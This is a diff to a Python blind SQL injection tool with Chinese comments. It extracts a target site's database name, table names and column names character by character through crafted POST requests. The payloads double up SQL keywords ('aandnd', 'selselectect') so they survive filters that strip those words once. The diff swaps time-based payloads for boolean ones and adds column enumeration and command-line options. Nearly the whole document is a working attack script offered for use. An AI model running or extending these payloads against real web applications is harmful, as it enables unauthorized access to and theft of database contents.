@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 import requests
 import sys
@@ -23,8 +23,15 @@ message="Logon failure"
 #要搜索的数据
 s_data="hello"
 
+#ascii码值范围
+low = 32
+high = 128
+
+#设置网络超时时间,单位为秒
+timeout=20
+
 #爆破库名ascii码值的payload
-payload_size="admin' aandnd iiff(asasciicii(subsubstrstr(database(),{},1))={},slesleepep(1),1)#"
+payload_size="admin' aandnd asasciicii(subsubstrstr(database(),{},1))={}#"
 
 #爆破表得个数
 num_table="admin' anandd (selselectect count(TABLE_NAME) frfromom infoorrmation_schema.TABLES whewherere TABLE_SCHEMA=database()) = {}#"
@@ -33,12 +40,23 @@ num_table="admin' anandd (selselectect count(TABLE_NAME) frfromom infoorrmation_
 len_table="admin' anandd (selselectect length(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database() limit {},1)={}#"
 
 #爆破表名的ascii码值的payload
-table_size="admin' aandnd iiff(asasciicii(subsubstrstr((seleselectct table_name frfromom infoorrmation_schema.tables whewherere table_schema = database() limit {},1),{},1))={},slesleepep(3),1)#"
+table_size="admin' aandnd asasciicii(subsubstrstr((seleselectct table_name frfromom infoorrmation_schema.tables whewherere table_schema = database() limit {},1),{},1))={}#"
+
+#爆破列的数量
+num_column="admin' anandd (selselectect count(column_name) frfromom infoorrmation_schema.columnS whewherere table_name='{}') = {}#"
+
+#爆破列的长度
+len_column="admin' anandd (selselectect length(column_name) frfromom infoorrmation_schema.columnS whewherere table_name='{}' limit {},1) = {}#"
+
+#爆破列名
+column_size="admin' anandd asasciicii(subsubstrstr((selselectect column_name frfromom infoorrmation_schema.columns whewherere table_name='{}' limit {},1),{},1)) = {}#"
+
+
 
 #get请求
 def get(url,payload):
     url=url+payload
-    result = requests.get(url).text
+    result = requests.get(url,timeout=timeout).text
     #print("你访问的url为：",url,"\t访问方式为get")
     return result
 
@@ -46,7 +64,7 @@ def get(url,payload):
 def post(url,payload,data):
     data = data.replace('*',payload)
     headers = {"Content-Type": "application/x-www-form-urlencoded"}
-    result = requests.post(url,data=data,headers=headers).text
+    result = requests.post(url,data=data,headers=headers,timeout=timeout).text
     #print("你访问的url为：",url,"\t访问方式为post")
     return result
 
@@ -91,7 +109,6 @@ def fuzz_D_len(url,method,data):
 
 #爆破数据库的ascii码值
 def fuzz_D_size(url,len,method,data):
-
     if data==None:
         data =''
     time = 1
@@ -100,21 +117,14 @@ def fuzz_D_size(url,len,method,data):
     elif method =='post':
         print("数据库名为:",end='')
         while time <= len:
-            low = 32
-            high = 128
-            mid = (high + low) // 2
             #payload = payload.replace("len",str(time))
-            while low < high:
+            for i in range (low,high+1):
                 #payload = payload.replace("size",str(mid))
-                payload = payload_size.format(time,mid)
+                payload = payload_size.format(time,i)
                 result = post(url,payload,data)
-                if message in result:
-                    high = mid
-                else:
-                    low += 1
-                #payload = payload.replace(str(mid),"size")
-                mid = (low+high)//2
-            print(chr(mid),end='')
+                if message not in result:
+                    print(chr(i),end='')
+                    break
             #payload = payload.replace(str(time),"len")
             time += 1
         print("\n")
@@ -163,45 +173,102 @@ def fuzz_T_size(url,len_T,method,data,num):
         result = get(url,payload)
     elif method =='post':
         for n in range(1,num+1):
-            print("第{}表名为:".format(n),end='')
+            print("第{}个表名为:".format(n),end='')
             while time <= len_T[n-1]:
-                low = 32
-                high = 128
-                mid = (high + low) // 2
                 #payload = payload.replace("len",str(time))
-                while low < high:
+                for i in range (low,high):
                     #payload = payload.replace("size",str(mid))
-                    payload = table_size.format((n-1),time,mid)
+                    payload = table_size.format((n-1),time,i)
                     result = post(url,payload,data)
-                    if message in result:
-                        high = mid
-                    else:
-                        low += 1
-                    #payload = payload.replace(str(mid),"size")
-                    mid = (low+high)//2
-                print(chr(mid),end='')
+                    if message not in result:
+                        print(chr(i),end='')
+                        break
                 #payload = payload.replace(str(time),"len")
                 time += 1
             print("\n")
 
+#爆破列的数量
+def fuzz_C_num(url,method,data,table_name):
+    if data==None:
+        data =''
+    if method =='get':
+        result = get(url,payload)
+    elif method =='post':
+        #猜列数量
+        for num in range(1,20):
+            payload=num_column.format(table_name,num)
+            result = post(url,payload,data)
+            if message not in result:
+                print("{}表的列数为：".format(table_name)+str(num))
+                return num
 
+#爆破列名长度
+def fuzz_C_len(url,method,data,table_name,column_num):
+    if data==None:
+        data =''
+    if method =='get':
+        result = get(url,payload)
+    elif method =='post':
+        #猜表长度
+        Length={}
+        for n in range(1,column_num+1):
+            for len in range(1,20):
+                payload=len_column.format(table_name,(n-1),len)
+                result = post(url,payload,data)
+                if message not in result:
+                    #print("第{}个表的长度为：".format(n)+str(len))
+                    Length[n-1]=len
+                    break
+        return Length
+    
+#爆破列名
+def fuzz_C_size(url,method,data,table_name,column_num,len_C):
+    if data==None:
+        data =''
+    if method =='get':
+        result = get(url,payload)
+    elif method =='post':
+        for n in range(1,column_num+1):
+            time = 1
+            print("第{}列名为:".format(n),end='')
+            while time <= len_C[n-1]:
+                #payload = payload.replace("len",str(time))
+                for i in range(low,high+1):
+                    #payload = payload.replace("size",str(mid))
+                    payload = column_size.format(table_name,(n-1),time,i)
+                    result = post(url,payload,data)
+                    if message not in result:
+                        print(chr(i),end='')
+                        break
+                    #payload = payload.replace(str(mid),"size")
+                #payload = payload.replace(str(time),"len")
+                time += 1
+            print("")
         
 
-def scan(url,method,data):
-    ##爆破数据库长度
-    len = fuzz_D_len(url,method,data)
-    ##爆破数据库名
-    fuzz_D_size(url,len,method,data)
-    #爆破表的数量
-    num = fuzz_T_num(url,method,data)
-    #爆破表的长度
-    len_T={}
-    len_T = fuzz_T_len(url,method,data,num)
-    for i in len_T:
-        print("第%i个表的长度为：" % (i+1) + str(len_T[i]))
-    #爆破表的值
-    fuzz_T_size(url,len_T,method,data,num)
-
+def scan(url,method,data,database_name,table_name,column_name):
+    # #爆破数据库长度
+    # len = fuzz_D_len(url,method,data)
+    # #爆破数据库名
+    # fuzz_D_size(url,len,method,data)
+    # #爆破表的数量
+    # num = fuzz_T_num(url,method,data)
+    # #爆破表的长度
+    # len_T={}
+    # len_T = fuzz_T_len(url,method,data,num)
+    # for i in len_T:
+    #     print("第%i个表的长度为：" % (i+1) + str(len_T[i]))
+    # #爆破表的值
+    # fuzz_T_size(url,len_T,method,data,num)
+    #爆破列的数量
+    column_num = fuzz_C_num(url,method,data,table_name)
+    #爆破列的长度
+    len_C={}
+    len_C = fuzz_C_len(url,method,data,table_name,column_num)
+    for i in len_C:
+        print("第%i列的长度为：" % (i+1) + str(len_C[i]))
+    #爆破列名
+    fuzz_C_size(url,method,data,table_name,column_num,len_C)
             #判断是否存在注入
             #check_sql(url,method,data,payload)
             #搜索数据
@@ -213,7 +280,11 @@ def main():
     parser = argparse.ArgumentParser()
     parser.add_argument("-U", "--url",required=True, help="URL to scan")
     parser.add_argument("-M","--method",default='get',help="get or post or others method,default is get")
-    parser.add_argument("-D","--data",help="the data that you want to post，you want check palces use * replace")
+    parser.add_argument("--data",help="the data that you want to post，you want check palces use * replace")
+    parser.add_argument("-D","--database",help="the data that you select database")
+    parser.add_argument("-T","--table",help="the data that you select table")
+    parser.add_argument("-C","--column",help="the data that you select column")
+
     args = parser.parse_args()
 
     if args.url==None:
@@ -222,7 +293,7 @@ def main():
         args.url = "http://%s" % args.url 
     #print("你访问的url为：",args.url)
     
-    scan(args.url,args.method,args.data)
+    scan(args.url,args.method,args.data,args.database,args.table,args.column)
 
 
 
